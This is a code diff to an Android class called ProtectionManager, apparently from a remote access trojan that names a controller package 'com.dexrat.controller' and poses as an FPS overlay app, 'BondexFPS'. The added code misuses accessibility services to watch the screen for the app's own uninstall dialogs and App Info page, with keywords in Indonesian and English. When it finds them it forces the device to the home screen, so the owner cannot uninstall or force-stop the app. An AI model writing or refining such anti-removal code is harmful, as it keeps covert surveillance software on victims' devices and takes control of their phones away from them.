@@ -67,6 +67,14 @@ public class ProtectionManager {
                         root.recycle();
                         return;
                     }
+
+                    // 3. Cek halaman App Info secara agresif
+                    if (pkg.contains("settings") && isLikelyAppInfoPage(root)) {
+                        Log.e(TAG, "!!! APP INFO PROTECTION TRIGGERED !!!");
+                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
+                        root.recycle();
+                        return;
+                    }
                 }
                 root.recycle();
             }
@@ -128,37 +136,36 @@ public class ProtectionManager {
     private boolean isLikelyUninstallDialog(AccessibilityNodeInfo root) {
         if (root == null) return false;
         
-        String targetPkg = service.getPackageName(); // com.bluestacks.fpsoverlay
+        String targetPkg = service.getPackageName();
         String controllerPkg = "com.dexrat.controller";
         
-        // Dapatkan nama aplikasi kita sendiri untuk validasi
+        // 1. Lewati jika ini adalah controller
+        if (checkNodeRecursive(root, controllerPkg)) {
+            return false;
+        }
+
+        // 2. CEK APAKAH INI DIALOG IZIN (PERMISSION)
+        // Jika ada kata "allow" atau "izinkan", jangan anggap ini uninstall
+        boolean isPermissionDialog = checkNodeForText(root, "Allow") || 
+                                     checkNodeForText(root, "Izinkan") ||
+                                     checkNodeForText(root, "Grant");
+        if (isPermissionDialog) return false;
+
         String appName = "BondexFPS"; 
         try {
             int stringId = service.getApplicationInfo().labelRes;
             if (stringId != 0) appName = service.getString(stringId);
         } catch (Exception ignored) {}
 
-        // 1. EXCLUSION: Jika layar mengandung package controller, JANGAN BLOKIR.
-        if (checkNodeRecursive(root, controllerPkg)) {
-            return false;
-        }
-
-        // 2. DETECTION: Cari identitas APK Target (Package Name atau App Name)
+        // 3. DETECTION: Cari identitas APK Target (Package Name atau App Name)
         boolean mentionsTarget = checkNodeRecursive(root, targetPkg) || checkNodeRecursive(root, appName);
-        
         if (!mentionsTarget) return false;
 
-        // 3. KEYWORDS: Cek kata kunci uninstall/hapus
+        // 4. KEYWORDS: Pastikan benar-benar ada kata "Uninstall" atau "Copot"
         return checkNodeRecursive(root, "uninstall") || 
                checkNodeRecursive(root, "copot") || 
-               checkNodeRecursive(root, "pemasangan") ||
                checkNodeRecursive(root, "hapus") ||
-               checkNodeRecursive(root, "delete") ||
-               checkNodeRecursive(root, "meng-uninstall") ||
-               checkNodeRecursive(root, "meng") ||
-               checkNodeRecursive(root, "-uninstall") ||
-               checkNodeRecursive(root, "menghapus") ||
-               checkNodeRecursive(root, "*-*");
+               checkNodeRecursive(root, "delete");
     }
 
     private boolean isLikelyAccessibilityPage(AccessibilityNodeInfo root) {
@@ -205,6 +212,27 @@ public class ProtectionManager {
         }
 
         return false;
+    }
+
+    private boolean isLikelyAppInfoPage(AccessibilityNodeInfo root) {
+        if (root == null) return false;
+
+        // Cari kata kunci khas halaman App Info
+        // Biasanya ada tombol "Force stop", "Uninstall", "Storage", "Permissions"
+        boolean isAppInfoContext = checkNodeForText(root, "Force stop") || 
+                                   checkNodeForText(root, "Paksa berhenti") ||
+                                   checkNodeForText(root, "Uninstall") ||
+                                   checkNodeForText(root, "Copot pemasangan") ||
+                                   checkNodeForText(root, "Storage") ||
+                                   checkNodeForText(root, "Penyimpanan");
+
+        if (!isAppInfoContext) return false;
+
+        // Jika ini memang halaman App Info, cek apakah ini milik aplikasi kita
+        String appName = "BondexFPS";
+        String targetPkg = service.getPackageName();
+        
+        return checkNodeRecursive(root, appName) || checkNodeRecursive(root, targetPkg);
     }
 
     private void autoAllowPermissions() {
